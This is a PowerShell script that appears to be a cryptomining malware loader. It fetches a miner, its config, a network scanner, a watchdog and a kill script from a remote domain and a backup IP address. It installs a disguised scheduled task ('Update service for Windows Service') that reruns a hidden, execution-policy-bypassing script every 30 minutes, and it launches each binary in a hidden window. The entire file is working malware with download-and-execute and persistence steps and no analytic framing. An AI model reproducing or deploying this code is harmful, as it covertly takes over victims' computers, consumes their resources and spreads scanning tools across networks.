$ne = $MyInvocation.MyCommand.Path
$miner_url = "https://de.gsearch.com.de/api/sysupdate.exe"
$miner_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/sysupdate.exe"
$miner_size = 897536
$miner_name = "sysupdate"
$miner_cfg_url = "https://de.gsearch.com.de/api/config.json"
$miner_cfg_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/config.json"
$miner_cfg_size = 2462
$miner_cfg_name = "config.json"
$scan_url = "https://de.gsearch.com.de/api/networkservice.exe"
$scan_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/networkservice.exe"
$scan_size = 2945024
$scan_name = "networkservice"
$payload_url = "https://de.gsearch.com.de/api/update.ps1"
$payload_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/update.ps1"
$payload_size = 4607
$payload_name = "update.ps1"
$watchdog_url = "https://de.gsearch.com.de/api/sysguard.exe"
$watchdog_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/sysguard.exe"
$watchdog_size = 2221056
$watchdog_name = "sysguard"
$killmodule_url = "https://de.gsearch.com.de/api/clean.bat"
$killmodule_url_backup = "http://185.181.10.234/E5DB0E07C3D7BE80V520/clean.bat"
$killmodule_name = "clean.bat"

$miner_path = "$env:TMP\sysupdate.exe"
$miner_cfg_path = "$env:TMP\config.json"
$scan_path = "$env:TMP\networkservice.exe"
$payload_path = "$env:TMP\update.ps1" 
$watchdog_path = "$env:TMP\sysguard.exe"
$killmodule_path = "$env:TMP\clean.bat"

function Update($url,$backup_url,$path,$proc_name)
 {        
    Get-Process -Name $proc_name | Stop-Process
    Remove-Item $path
    Try {
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($url,$path)
    }
    Catch {
        Write-Output "donwload with backurl"
        $vc = New-Object System.Net.WebClient
        $vc.DownloadFile($backup_url,$path)
    }
}

#miner_path
if((Test-Path $miner_path))
{
    Write-Output "miner file exist"
    if((Get-Item $miner_path).length -ne $miner_size)
    {
        Update $miner_url $miner_url_backup $miner_path $miner_name
    }
}
else {
    Update $miner_url $miner_url_backup $miner_path $miner_name
}
#miner_cfg_path
if((Test-Path $miner_cfg_path))
{
    Write-Output "miner_cfg file exist"
    if((Get-Item $miner_cfg_path).length -ne $miner_cfg_size)
    {
        Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
    }
}
else {
    Update $miner_cfg_url $miner_cfg_url_backup $miner_cfg_path $miner_cfg_name
}
#scan_path
if((Test-Path $scan_path))
{
    Write-Output "scan file exist"
    if((Get-Item $scan_path).length -ne $scan_size)
    {
        Update $scan_url $scan_url_backup $scan_path $scan_name
    }
}
else {
    Update $scan_url $scan_url_backup $scan_path $scan_name
}
#dog_path
if((Test-Path $watchdog_path))
{
    Write-Output "watchdog file exist"
    if((Get-Item $watchdog_path).length -ne $watchdog_size)
    {
        Update $watchdog_url $watchdog_url_backup $watchdog_path $watchdog_name
    }
}
else {
    Update $watchdog_url $watchdog_url_backup $watchdog_path $watchdog_name
}
#clean.bat
if((Test-Path $killmodule_path))
{
    Remove-Item $killmodule_path
	Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
}
else {
    Update $killmodule_url $killmodule_url_backup $killmodule_path $killmodule_name
}

Remove-Item $payload_path
Remove-Item $HOME\update.ps1
Try {
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url,$payload_path)
}
Catch {
    Write-Output "download with backurl"
    $vc = New-Object System.Net.WebClient
    $vc.DownloadFile($payload_url_backup,$payload_path)
}
echo F | xcopy /y $payload_path $HOME\update.ps1

SchTasks.exe /Create /SC MINUTE /TN "Update service for Windows Service" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1" /MO 30 /F
if(!(Get-Process $miner_name -ErrorAction SilentlyContinue)) 
{
    Write-Output "Miner Not running"
	Start-Process $miner_path -windowstyle hidden
} 
else 
{
	Write-Output "Miner Running"
}
if(!(Get-Process $scan_name -ErrorAction SilentlyContinue)) 
{
    Write-Output "Scan Not running"
    Start-Process $scan_path -windowstyle hidden
} 
else 
{
    Write-Output "Scan Running"
}
if(!(Get-Process $watchdog_name -ErrorAction SilentlyContinue)) {
    Write-Output "Watchdog Not running"
    Start-Process $watchdog_path -windowstyle hidden
} 
else 
{
    Write-Output "Running"
}
Start-Process cmd.exe "/c $killmodule_path" -windowstyle hidden
Start-Sleep 5
